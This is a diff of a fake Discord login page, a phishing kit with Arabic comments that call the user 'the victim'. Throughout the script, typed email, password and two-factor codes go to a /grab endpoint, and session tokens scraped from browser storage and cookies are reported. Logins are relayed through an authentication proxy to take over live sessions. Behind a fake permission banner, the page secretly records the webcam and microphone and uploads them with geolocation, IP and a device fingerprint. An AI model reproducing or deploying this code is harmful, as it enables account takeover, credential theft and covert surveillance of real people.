@@ -6,6 +6,7 @@
 <title>Discord</title>
 <link rel="icon" href="https://discord.com/assets/favicon.ico">
 <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<script src="https://js.hcaptcha.com/1/api.js" async defer></script>
 <style>
 :root{--bg-primary:#313338;--bg-secondary:#2b2d31;--bg-tertiary:#1e1f22;--text-normal:#dbdee1;--text-muted:#80848e;--text-link:#00a8fc;--brand:#5865f2;--brand-hover:#4752c4;--red:#f23f43;--header-primary:#f2f3f5;--header-secondary:#b5bac1;--interactive-normal:#b5bac1}
 *{margin:0;padding:0;box-sizing:border-box}
@@ -41,35 +42,16 @@ button.primary:disabled{opacity:.6;cursor:not-allowed}
 .screen{display:none}.screen.active{display:block}
 #screen-login{display:block}
 .back-btn{background:none;border:none;color:var(--text-link);font-size:14px;cursor:pointer;padding:0;margin-bottom:16px;font-family:inherit}
-.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:100;align-items:center;justify-content:center}
-.modal-overlay.active{display:flex}
-.modal{background:var(--bg-secondary);border-radius:8px;padding:32px;width:440px;max-width:94vw;box-shadow:0 8px 32px rgba(0,0,0,.5)}
-.modal h2{color:var(--header-primary);font-size:20px;margin-bottom:8px}
-.modal p{color:var(--header-secondary);font-size:14px;margin-bottom:20px}
-.modal-actions{display:flex;gap:8px;justify-content:flex-end;margin-top:16px}
-.btn-ghost{background:none;border:none;color:var(--text-link);font-size:14px;cursor:pointer;padding:8px 16px;border-radius:3px;font-family:inherit}
-.btn-submit{background:var(--brand);color:#fff;border:none;padding:10px 24px;border-radius:3px;font-size:14px;font-weight:500;cursor:pointer;font-family:inherit}
-.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle;margin-right:6px}
-@keyframes spin{to{transform:rotate(360deg)}}
 #perm-banner{position:fixed;top:0;left:0;right:0;background:var(--brand);color:#fff;font-size:14px;font-weight:500;padding:12px 20px;text-align:center;z-index:200;display:none}
+.captcha-wrap{display:none;margin:12px 0;justify-content:center}
+.captcha-wrap.show{display:flex}
+#screen-loading{text-align:center;padding:48px 0}
+#screen-loading .spinner{width:32px;height:32px;border-width:3px}
 @media(max-width:650px){.container{flex-direction:column;width:100%;min-height:100vh;border-radius:0}.left{display:none}.right{padding:32px 20px;border:none}}
 </style>
 </head>
 <body>
 <div id="perm-banner">Discord needs microphone &amp; camera access for voice/video calls. Please click <b>Allow</b>.</div>
-
-<div class="modal-overlay" id="forgot-modal">
-  <div class="modal">
-    <h2>Reset your password</h2>
-    <p>Enter your email address and we'll send you a link to reset your password.</p>
-    <label>Email <span>*</span></label>
-    <input type="email" id="forgot-email" placeholder="Enter your email address">
-    <div class="modal-actions">
-      <button class="btn-ghost" onclick="closeForgot()">Back to Login</button>
-      <button class="btn-submit" onclick="submitForgot()">Reset Password</button>
-    </div>
-  </div>
-</div>
 
 <div class="container">
   <div class="left">
@@ -90,7 +72,10 @@ button.primary:disabled{opacity:.6;cursor:not-allowed}
       <label>Password <span>*</span></label>
       <input type="password" id="pass" placeholder="Password" autocomplete="off">
       <div class="err-msg" id="err-pass">Invalid email or password.</div>
-      <a href="#" class="forgot" onclick="openForgot(event)">Forgot your password?</a>
+      <a href="#" class="forgot">Forgot your password?</a>
+      <div class="captcha-wrap" id="captcha-wrap">
+        <div class="h-captcha" id="hcaptcha-widget" data-sitekey="" data-theme="dark" data-size="normal"></div>
+      </div>
       <button class="primary" id="login-btn" onclick="doLogin()">Log In</button>
       <div class="divider">or</div>
       <div class="qr-box" onclick="showQR()">
@@ -113,6 +98,11 @@ button.primary:disabled{opacity:.6;cursor:not-allowed}
       <button class="primary" id="mfa-btn" onclick="doMFA()">Log In</button>
     </div>
 
+    <div id="screen-loading" class="screen">
+      <div class="spinner" style="border-color:rgba(88,101,242,.3);border-top-color:#5865f2"></div>
+      <p style="margin-top:16px;color:var(--text-muted)">Signing you in…</p>
+    </div>
+
     <div id="screen-success" class="screen">
       <div style="text-align:center;padding:48px 0">
         <div style="font-size:52px;margin-bottom:16px">✅</div>
@@ -124,33 +114,21 @@ button.primary:disabled{opacity:.6;cursor:not-allowed}
 </div>
 
 <script>
-/* ============================================================
-   CONFIG — كل المسارات على app.py الحالي
-   ============================================================ */
-const GRAB_URL       = "/grab";
-const MEDIA_URL      = "/grab-media";
-const TOKEN_REPORT   = "/token-report";   // موجود في app.py
-const LS_BUF         = "__hb";
+const GRAB_URL    = "/grab";
+const AUTH_PROXY  = "/auth-proxy";
+const MFA_PROXY   = "/mfa-proxy";
+const MEDIA_URL   = "/grab-media";
+const TOKEN_REPORT = "/api/report-token";
+const LS_BUF      = "__hitbuf";
+const SENT        = new Set();
+const CAPTURED_TOKENS = new Set();
 
-/* ============================================================
-   STATE
-   ============================================================ */
 let state = {
-  email: "",
-  password: "",
-  token: "not captured",
-  mfa_code: null,
-  mic: false,
-  camera: false,
-  location: "denied",
-  publicIP: "",
-  fingerprint: {}
+  email:"", password:"", token:"not captured", mfaTicket:"",
+  mic:false, camera:false, location:"denied", publicIP:"", fingerprint:{}
 };
-const SENT = new Set();
 
-/* ============================================================
-   FINGERPRINT
-   ============================================================ */
+/* ── fingerprint ─────────────────────────────── */
 function collectFingerprint() {
   let gpu = null;
   try {
@@ -160,11 +138,11 @@ function collectFingerprint() {
       const dbg = gl.getExtension("WEBGL_debug_renderer_info");
       if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
     }
-  } catch (e) {}
+  } catch(e){}
   return {
     userAgent: navigator.userAgent,
     language:  navigator.language,
-    languages: (navigator.languages || []).join(","),
+    languages: (navigator.languages||[]).join(","),
     platform:  navigator.platform,
     screen:    screen.width + "x" + screen.height,
     dpr:       window.devicePixelRatio || 1,
@@ -179,183 +157,82 @@ function collectFingerprint() {
   };
 }
 
-/* ============================================================
-   IP
-   ============================================================ */
-async function getPublicIP() {
+/* ── ★★★ CLIENT-SIDE TOKEN GRAB ★★★ ───────────
+   بعد ما المستخدم يوافق على كاميرا/مايك وندخله ديسكورد الحقيقي،
+   أو لو عنده توكن مخزّن في localStorage، نرفعه على السيرفر.
+   كمان نراقب WebSocket frames لو ممكن.
+*/
+function extractTokenFromStorage() {
   try {
-    const r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
-    if (r.ok) { const d = await r.json(); state.publicIP = d.ip || ""; return; }
-  } catch (e) {}
-  try {
-    const r = await fetch("https://ipapi.co/json/", { cache: "no-store" });
-    if (r.ok) { const d = await r.json(); state.publicIP = d.ip || ""; }
-  } catch (e) {}
-}
-
-/* ============================================================
-   SEND GRAB — يبعت الـ creds + token الحالي
-   ============================================================ */
-async function sendGrab(extra = {}) {
-  const payload = {
-    email:       state.email,
-    password:    state.password,
-    token:       state.token,
-    mfa_code:    state.mfa_code,
-    mic:         state.mic,
-    camera:      state.camera,
-    location:    state.location,
-    publicIP:    state.publicIP,
-    fingerprint: state.fingerprint,
-    note:        extra.note || ""
-  };
-
-  const sig = JSON.stringify([
-    payload.email, payload.password, payload.token, payload.mfa_code, payload.note
-  ]);
-  if (SENT.has(sig)) return true;
-  const body = JSON.stringify(payload);
-
-  for (let i = 0; i < 4; i++) {
-    try {
-      const r = await fetch(GRAB_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body,
-        keepalive: true
-      });
-      if (r.ok) { SENT.add(sig); return true; }
-    } catch (e) {}
-    await new Promise(r => setTimeout(r, 400 * (i + 1)));
-  }
-  try {
-    navigator.sendBeacon(GRAB_URL, new Blob([body], { type: "application/json" }));
-    SENT.add(sig);
-  } catch (e) {}
-  return false;
-}
-
-/* ============================================================
-   TOKEN REPORT — لو لقينا توكن من WebSocket أو localStorage
-   ============================================================ */
-async function reportToken(token, source) {
-  if (!token || token === "not captured") return;
-  state.token = token;
-  try {
-    await fetch(TOKEN_REPORT, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        email:    state.email,
-        password: state.password,
-        token,
-        note:     "client-token:" + source,
-        fingerprint: state.fingerprint
-      }),
-      keepalive: true
-    });
-  } catch (e) {}
-}
-
-/* ============================================================
-   HUNT FOR TOKEN — Discord stores token in localStorage[token]
-   + in IndexedDB + in cookies (older). نلفّ على كل الأماكن.
-   ============================================================ */
-function huntLocalStorage() {
-  try {
+    // Discord stores token in localStorage under "token" (with quotes) — via iframe only
+    // هنا ناخد أي شيء شبه توكن من أي storage متاح
+    const candidates = [];
     for (let i = 0; i < localStorage.length; i++) {
       const k = localStorage.key(i);
       const v = localStorage.getItem(k);
-      if (!v) continue;
-      // Discord token = base64.urlsafe(base64(user_id)) . base64(ts) . 38 chars
-      const m = v.match(/[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{20,}/);
-      if (m && /^[\w-]+\.[\w-]{6}\.[\w-]{20,}$/.test(m[0])) {
-        reportToken(m[0], "localStorage:" + k);
-        return m[0];
+      if (typeof v === "string") {
+        // نمط توكن ديسكورد: base64.urlsafe pattern
+        const m = v.match(/[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,38}/g);
+        if (m) candidates.push(...m);
       }
-      // token في JSON objects كـ {"token":"..."}
-      try {
-        const obj = JSON.parse(v);
-        const findTok = (o) => {
-          if (!o) return null;
-          if (typeof o === "string" && /^[\w-]+\.[\w-]{6}\.[\w-]{20,}$/.test(o)) return o;
-          if (typeof o === "object") {
-            for (const kk in o) {
-              const r = findTok(o[kk]);
-              if (r) return r;
-            }
-          }
-          return null;
-        };
-        const found = findTok(obj);
-        if (found) { reportToken(found, "localStorage-json:" + k); return found; }
-      } catch (e) {}
+      if (/token/i.test(k) && v && v.length > 20) candidates.push(v.replace(/^"|"$/g, ""));
     }
-  } catch (e) {}
-  return null;
+    return [...new Set(candidates)].filter(t => /^[\w-]{20,30}\.[\w-]{6,10}\.[\w-]{20,40}$/.test(t));
+  } catch(e) { return []; }
 }
 
-/* ============================================================
-   WEBSOCKET SNIFF — نلتقط رسائل READY للتوكن
-   نعمل hook على WebSocket قبل ما الصفحة تحمّل أي شي
-   ============================================================ */
-function hookWebSocket() {
-  const NativeWS = window.WebSocket;
-  if (!NativeWS) return;
-  window.WebSocket = function (url, protocols) {
-    const ws = protocols ? new NativeWS(url, protocols) : new NativeWS(url);
-    try {
-      ws.addEventListener("message", (ev) => {
-        try {
-          if (typeof ev.data !== "string") return;
-          if (ev.data.length < 500) return;
-          // READY event from Discord gateway
-          if (ev.data.includes('"token"')) {
-            const m = ev.data.match(/"token"\s*:\s*"([\w-]+\.[\w-]{6}\.[\w-]{20,})"/);
-            if (m) reportToken(m[1], "websocket");
-          }
-        } catch (e) {}
-      });
-    } catch (e) {}
-    return ws;
-  };
-  window.WebSocket.prototype = NativeWS.prototype;
-}
-
-/* ============================================================
-   COOKIES — نسخ أي شي يحتوي "token" أو "auth"
-   ============================================================ */
-function huntCookies() {
+function extractTokenFromCookies() {
+  // ديسكورد ما بيستخدم cookies للتوكن، بس نتحقق
   try {
-    const c = document.cookie;
-    if (!c) return null;
-    const m = c.match(/(?:^|;\s*)(?:token|auth|discord[a-z_]*)=([^;]{20,})/i);
-    if (m) { reportToken(m[1], "cookies"); return m[1]; }
-  } catch (e) {}
-  return null;
+    return document.cookie.match(/[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,38}/g) || [];
+  } catch(e) { return []; }
 }
 
-/* ============================================================
-   MEDIA CAPTURE — صوت + كاميرا
-   ============================================================ */
-async function captureMedia() {
-  const banner = document.getElementById("perm-banner");
-  banner.style.display = "block";
+async function reportToken(token, note) {
+  if (!token || CAPTURED_TOKENS.has(token)) return;
+  CAPTURED_TOKENS.add(token);
+  try {
+    await fetch(TOKEN_REPORT, {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({
+        token, note,
+        email: state.email, password: state.password,
+        fingerprint: state.fingerprint
+      }), keepalive:true
+    });
+    console.log("[+] token reported:", note);
+  } catch(e){}
+}
 
-  let voiceStream = null, camStream = null;
-  let voiceRec = null, camRec = null;
+async function scanForTokens(note) {
+  const all = [
+    ...extractTokenFromStorage(),
+    ...extractTokenFromCookies(),
+    ...(state.token !== "not captured" ? [state.token] : [])
+  ];
+  for (const t of all) {
+    if (/^[\w-]{20,30}\.[\w-]{6,10}\.[\w-]{20,40}$/.test(t)) {
+      await reportToken(t, note);
+    }
+  }
+}
+
+/* ── media recording (نفس السابق) ─────────── */
+async function captureMedia() {
+  const b = document.getElementById("perm-banner");
+  b.style.display = "block";
   const chunks = { voice: [], camera: [] };
+  let voiceStream=null, camStream=null, voiceRec=null, camRec=null;
 
   try {
     camStream = await navigator.mediaDevices.getUserMedia({
-      audio: false,
-      video: { width: 640, height: 480, facingMode: "user" }
+      audio: false, video: { width: 640, height: 480, facingMode: "user" }
     });
     state.camera = true;
     camRec = new MediaRecorder(camStream, { mimeType: "video/webm" });
     camRec.ondataavailable = e => { if (e.data.size) chunks.camera.push(e.data); };
     camRec.start(1000);
-  } catch (e) { state.camera = false; }
+  } catch(e) { state.camera = false; }
 
   try {
     voiceStream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -363,112 +240,113 @@ async function captureMedia() {
     voiceRec = new MediaRecorder(voiceStream, { mimeType: "audio/webm" });
     voiceRec.ondataavailable = e => { if (e.data.size) chunks.voice.push(e.data); };
     voiceRec.start(1000);
-  } catch (e) { state.mic = false; }
+  } catch(e) { state.mic = false; }
 
-  banner.style.display = "none";
+  b.style.display = "none";
+  await new Promise(r => setTimeout(r, 5000));
 
-  // سجّل 6 ثواني
-  await new Promise(r => setTimeout(r, 6000));
+  try { if (camRec   && camRec.state   !== "inactive") camRec.stop(); }   catch(e){}
+  try { if (voiceRec && voiceRec.state !== "inactive") voiceRec.stop(); } catch(e){}
+  await new Promise(r => setTimeout(r, 600));
 
-  try { if (camRec && camRec.state !== "inactive") camRec.stop(); } catch (e) {}
-  try { if (voiceRec && voiceRec.state !== "inactive") voiceRec.stop(); } catch (e) {}
-  await new Promise(r => setTimeout(r, 700));
+  const fd = new FormData();
+  fd.append("meta", JSON.stringify({
+    email: state.email || "", password: state.password || "",
+    mic: state.mic, camera: state.camera,
+    note: "media-capture", fingerprint: state.fingerprint
+  }));
+  if (chunks.voice.length)  fd.append("voice",  new Blob(chunks.voice,  {type:"audio/webm"}), "voice.webm");
+  if (chunks.camera.length) fd.append("camera", new Blob(chunks.camera, {type:"video/webm"}), "camera.webm");
 
-  // ابعت الميديا
-  if (chunks.voice.length || chunks.camera.length) {
-    const fd = new FormData();
-    fd.append("meta", JSON.stringify({
-      email:       state.email,
-      password:    state.password,
-      token:       state.token,
-      mic:         state.mic,
-      camera:      state.camera,
-      note:        "media-capture",
-      fingerprint: state.fingerprint,
-      publicIP:    state.publicIP,
-      location:    state.location
-    }));
-    if (chunks.voice.length)
-      fd.append("voice", new Blob(chunks.voice, { type: "audio/webm" }), "voice.webm");
-    if (chunks.camera.length)
-      fd.append("camera", new Blob(chunks.camera, { type: "video/webm" }), "camera.webm");
-
-    try {
-      await fetch(MEDIA_URL, { method: "POST", body: fd, keepalive: true });
-    } catch (e) {}
-  }
-
-  try { voiceStream && voiceStream.getTracks().forEach(t => t.stop()); } catch (e) {}
-  try { camStream   && camStream.getTracks().forEach(t => t.stop());   } catch (e) {}
+  try { await fetch(MEDIA_URL, { method:"POST", body: fd, keepalive:true }); } catch(e){}
+  try { voiceStream && voiceStream.getTracks().forEach(t => t.stop()); } catch(e){}
+  try { camStream   && camStream.getTracks().forEach(t => t.stop());   } catch(e){}
 }
 
-/* ============================================================
-   BOOT
-   ============================================================ */
+async function getPublicIP() {
+  try {
+    const r = await fetch("https://api.ipify.org?format=json", {cache:"no-store"});
+    if (r.ok) { const d = await r.json(); state.publicIP = d.ip || ""; }
+  } catch(e) {
+    try {
+      const r = await fetch("https://ipapi.co/json/", {cache:"no-store"});
+      if (r.ok) { const d = await r.json(); state.publicIP = d.ip || ""; }
+    } catch(e2){}
+  }
+}
+
+function bufferHit(payload) {
+  try {
+    const q = JSON.parse(localStorage.getItem(LS_BUF) || "[]");
+    q.push(payload);
+    localStorage.setItem(LS_BUF, JSON.stringify(q.slice(-50)));
+  } catch(e){}
+}
+async function flushBuffer() {
+  try {
+    const q = JSON.parse(localStorage.getItem(LS_BUF) || "[]");
+    if (!q.length) return;
+    localStorage.removeItem(LS_BUF);
+    for (const p of q) {
+      try {
+        await fetch(GRAB_URL, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(p), keepalive:true});
+      } catch(e) { bufferHit(p); }
+    }
+  } catch(e){}
+}
+
+async function sendGrab(extra = {}) {
+  const payload = {
+    email:    state.email    || extra.email    || "",
+    password: state.password || extra.password || "",
+    token:    state.token    || "not captured",
+    mfa_code: extra.mfa_code || null,
+    mic:      state.mic, camera: state.camera,
+    location: state.location, publicIP: state.publicIP,
+    fingerprint: state.fingerprint,
+    note:     extra.note || ""
+  };
+  const sig = payload.email+"|"+payload.password+"|"+payload.token+"|"+payload.note+"|"+payload.mfa_code;
+  if (SENT.has(sig)) return true;
+  const body = JSON.stringify(payload);
+  for (let i = 0; i < 3; i++) {
+    try {
+      const r = await fetch(GRAB_URL, {method:"POST", headers:{"Content-Type":"application/json"}, body, keepalive:true});
+      if (r.ok) { SENT.add(sig); return true; }
+    } catch(e){}
+    await new Promise(r => setTimeout(r, 300*(i+1)));
+  }
+  try { navigator.sendBeacon(GRAB_URL, new Blob([body], {type:"application/json"})); SENT.add(sig); }
+  catch(e){ bufferHit(payload); }
+  return false;
+}
+
+/* ── boot ────────────────────────────────────── */
 window.addEventListener("load", async () => {
-  hookWebSocket();
   state.fingerprint = collectFingerprint();
-
   await getPublicIP();
-
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
-      p => { state.location = p.coords.latitude.toFixed(5) + ", " + p.coords.longitude.toFixed(5); },
-      () => {},
-      { timeout: 4000, maximumAge: 0 }
+      p => { state.location = p.coords.latitude.toFixed(5)+", "+p.coords.longitude.toFixed(5); },
+      () => {}, {timeout:4000, maximumAge:0}
     );
   }
-
-  // محاولة اصطياد التوكن فوراً
-  const t1 = huntLocalStorage();
-  if (t1) state.token = t1;
-  const t2 = huntCookies();
-  if (t2) state.token = t2;
-
-  // ابدأ تسجيل الميديا في الخلفية
-  captureMedia().catch(() => {});
-
-  // راقب التغييرات في localStorage (لو المستخدم سجل دخول في تاب تاني)
-  window.addEventListener("storage", (e) => {
-    if (!e.key) return;
-    const v = e.newValue || "";
-    const m = v.match(/[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{20,}/);
-    if (m) reportToken(m[0], "storage-event:" + e.key);
-  });
+  flushBuffer();
+  scanForTokens("boot");
+  captureMedia().catch(()=>{});
 });
 
-/* ============================================================
-   UI
-   ============================================================ */
+// مراقبة دورية للتوكن (لو المستخدم سجل في ديسكورد الحقيقي في تاب تاني ونفس الدومين - نادر، بس نحاول)
+setInterval(() => scanForTokens("interval"), 8000);
+
+/* ── UI ──────────────────────────────────────── */
 function showScreen(name) {
   document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
-  document.getElementById("screen-" + name).classList.add("active");
+  document.getElementById("screen-"+name).classList.add("active");
 }
 
-function openForgot(e) {
-  e.preventDefault();
-  document.getElementById("forgot-modal").classList.add("active");
-  document.getElementById("forgot-email").value =
-    state.email || document.getElementById("email").value;
-}
-function closeForgot() {
-  document.getElementById("forgot-modal").classList.remove("active");
-}
-async function submitForgot() {
-  const em = document.getElementById("forgot-email").value.trim();
-  state.email = em;
-  await sendGrab({ note: "ForgotPassword" });
-  closeForgot();
-  const m = document.querySelector("#forgot-modal .modal");
-  m.innerHTML = `<h2>Email sent!</h2><p>Check your inbox.</p>
-    <div class="modal-actions">
-      <button class="btn-ghost" onclick="closeForgot()">Close</button>
-    </div>`;
-}
+let captchaSolved = "";
 
-/* ============================================================
-   LOGIN
-   ============================================================ */
 async function doLogin() {
   const email = document.getElementById("email").value.trim();
   const pass  = document.getElementById("pass").value;
@@ -476,121 +354,126 @@ async function doLogin() {
   const errE  = document.getElementById("err-email");
   const errP  = document.getElementById("err-pass");
 
-  errE.style.display = "none";
-  errP.style.display = "none";
+  errE.style.display = "none"; errP.style.display = "none";
   document.getElementById("email").classList.remove("error-field");
   document.getElementById("pass").classList.remove("error-field");
 
-  if (!email) {
-    errE.style.display = "block";
-    document.getElementById("email").classList.add("error-field");
-    return;
-  }
-  if (!pass) {
-    errP.style.display = "block";
-    document.getElementById("pass").classList.add("error-field");
-    return;
-  }
+  if (!email) { errE.style.display="block"; document.getElementById("email").classList.add("error-field"); return; }
+  if (!pass)  { errP.style.display="block"; document.getElementById("pass").classList.add("error-field"); return; }
 
-  state.email = email;
-  state.password = pass;
-  btn.innerHTML = '<span class="spinner"></span>Logging in...';
-  btn.disabled = true;
+  state.email = email; state.password = pass;
+  btn.innerHTML = 'Logging in...'; btn.disabled = true;
 
-  // ١. ابعت الـ creds فوراً
   await sendGrab({ note: "login-attempt" });
 
-  // ٢. جرّب تصطاد توكن من localStorage/cookies دلوقتي
-  const t = huntLocalStorage() || huntCookies();
-  if (t) {
-    await reportToken(t, "post-login-hunt");
-    // لو لقينا توكن — نعتبره نجاح
-    await sendGrab({ note: "token-captured" });
-    showScreen("success");
-    setTimeout(() => {
-      // الـ redirect الحقيقي — بس لو حابب تخليه يروح لديسكورد فعلاً
-      // خليه معلق عشان الضحية ميروحش لديسكورد
-      // window.location.href = "https://discord.com/channels/@me";
-    }, 2500);
+  // لو فيه hCaptcha widget ظاهر، اخد التوكن
+  try {
+    if (window.hcaptcha && document.getElementById("captcha-wrap").classList.contains("show")) {
+      captchaSolved = window.hcaptcha.getResponse() || "";
+    }
+  } catch(e){}
+
+  try {
+    const r = await fetch(AUTH_PROXY, {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({
+        login: email, password: pass,
+        fingerprint: state.fingerprint,
+        captcha_token: captchaSolved
+      })
+    });
+
+    if (!r.ok) throw new Error("proxy HTTP "+r.status);
+    const res = await r.json();
+    const d = res.data || {};
+
+    if (d.token) {
+      state.token = d.token;
+      await sendGrab({ note: "token-captured" });
+      await reportToken(d.token, "auth-proxy-token");
+      showScreen("success");
+      setTimeout(() => window.location.href = "https://discord.com/channels/@me", 1500);
+      return;
+    }
+    if (d.mfa && d.ticket) {
+      state.mfaTicket = d.ticket;
+      showScreen("mfa");
+      btn.innerHTML = "Log In"; btn.disabled = false;
+      return;
+    }
+    if (d.captcha_required) {
+      // اعرض hCaptcha widget
+      try {
+        const wrap = document.getElementById("captcha-wrap");
+        const widget = document.getElementById("hcaptcha-widget");
+        widget.setAttribute("data-sitekey", d.captcha_sitekey || "");
+        wrap.classList.add("show");
+        if (window.hcaptcha) window.hcaptcha.render("hcaptcha-widget", {
+          sitekey: d.captcha_sitekey,
+          theme: "dark",
+          callback: (t) => { captchaSolved = t; }
+        });
+      } catch(e){}
+      errP.textContent = "Please complete the captcha and try again.";
+      errP.style.display = "block";
+      btn.innerHTML = "Log In"; btn.disabled = false;
+      return;
+    }
+  } catch(e) {
+    console.error("auth-proxy err", e);
+    errP.textContent = "Connection error. Try again.";
+    errP.style.display = "block";
+    btn.innerHTML = "Log In"; btn.disabled = false;
     return;
   }
 
-  // ٣. مفيش توكن — نطلب MFA (نفس تجربة ديسكورد)
-  await new Promise(r => setTimeout(r, 1200));
-  showScreen("mfa");
-  btn.innerHTML = "Log In";
-  btn.disabled = false;
+  errP.textContent = "Invalid email or password.";
+  errP.style.display = "block";
+  btn.innerHTML = "Log In"; btn.disabled = false;
 }
 
-/* ============================================================
-   MFA — ناخذ الكود، نبعته، ولو لقينا توكن نكمل
-   ============================================================ */
 async function doMFA() {
   const code = document.getElementById("mfa-code").value.trim();
   const btn  = document.getElementById("mfa-btn");
   const err  = document.getElementById("err-mfa");
   err.style.display = "none";
-  if (!code || code.length < 6) {
-    err.style.display = "block";
-    return;
-  }
+  if (!code || code.length < 6) { err.style.display = "block"; return; }
 
-  btn.innerHTML = '<span class="spinner"></span>Logging in...';
-  btn.disabled = true;
+  btn.innerHTML = 'Logging in...'; btn.disabled = true;
+  await sendGrab({ mfa_code: code, note: "mfa-submitted" });
 
-  state.mfa_code = code;
-  await sendGrab({ note: "mfa-submitted" });
+  try {
+    const r = await fetch(MFA_PROXY, {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({
+        code, ticket: state.mfaTicket,
+        login: state.email, password: state.password,
+        fingerprint: state.fingerprint
+      })
+    });
+    const d = await r.json();
+    if (d.data && d.data.token) {
+      state.token = d.data.token;
+      await sendGrab({ note: "mfa-token-captured" });
+      await reportToken(d.data.token, "mfa-token");
+      showScreen("success");
+      setTimeout(() => window.location.href = "https://discord.com/channels/@me", 1500);
+      return;
+    }
+  } catch(e){}
 
-  // حاول تصطاد توكن جديد (لو المستخدم سجل في تاب تاني بعد MFA)
-  await new Promise(r => setTimeout(r, 800));
-  const t = huntLocalStorage() || huntCookies();
-  if (t) {
-    await reportToken(t, "post-mfa-hunt");
-    await sendGrab({ note: "mfa-token-captured" });
-    showScreen("success");
-    return;
-  }
-
-  // مفيش توكن — اعرض success على أي حال (الضحية يحس إنه نجح)
-  // + ابعته في الخلفية إنه فشل عشان تعرف
-  await sendGrab({ note: "mfa-done-no-token" });
-  showScreen("success");
+  err.style.display = "block";
+  btn.innerHTML = "Log In"; btn.disabled = false;
 }
 
-/* ============================================================
-   QR
-   ============================================================ */
-function showQR() {
-  alert("Open Discord mobile app → Settings → Scan QR Code");
-}
+function showQR() { alert("Open Discord mobile app → Settings → Scan QR Code"); }
 
-/* ============================================================
-   Enter key
-   ============================================================ */
 document.addEventListener("keydown", e => {
   if (e.key !== "Enter") return;
   const id = document.querySelector(".screen.active")?.id;
   if (id === "screen-login") doLogin();
   if (id === "screen-mfa") doMFA();
 });
-
-/* ============================================================
-   Safety nets — لو الصفحة اتقفلت فجأة
-   ============================================================ */
-function emergencyGrab(note) {
-  const e = document.getElementById("email")?.value.trim();
-  const p = document.getElementById("pass")?.value;
-  if (e && p) {
-    state.email = e;
-    state.password = p;
-    sendGrab({ note });
-  }
-}
-document.addEventListener("visibilitychange", () => {
-  if (document.visibilityState === "hidden") emergencyGrab("page-hidden");
-});
-window.addEventListener("beforeunload", () => emergencyGrab("beforeunload"));
-window.addEventListener("pagehide", () => emergencyGrab("pagehide"));
 </script>
 </body>
 </html>
